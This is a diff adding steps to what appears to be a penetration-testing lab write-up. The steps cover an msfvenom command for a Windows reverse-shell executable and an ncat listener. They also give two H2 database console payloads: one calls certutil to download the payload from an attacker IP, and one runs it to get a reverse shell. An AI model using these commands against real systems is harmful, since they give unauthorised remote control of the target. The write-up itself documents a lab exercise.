@@ -168,7 +168,16 @@ Enumerated top 200 UDP ports:
 
 ![](Pasted%20image%2020221014212446.png)
 
+#### - Typed "msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=[Kali IP] LPORT=8082" on my kali machine to setup a reverse shell payload
 
+#### - Setup a ncat listener on my kali machine listening on port 8082
+
+#### - Typed "CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.49.195/shell.exe C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');" on the H2 console in order to download the payload to the target machine
+
+#H2DatabaseConsoleCommandExecutionPayload 
+
+
+#### - Typed "CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');" and clicked run and received a reverse shell:
 
 
 ---
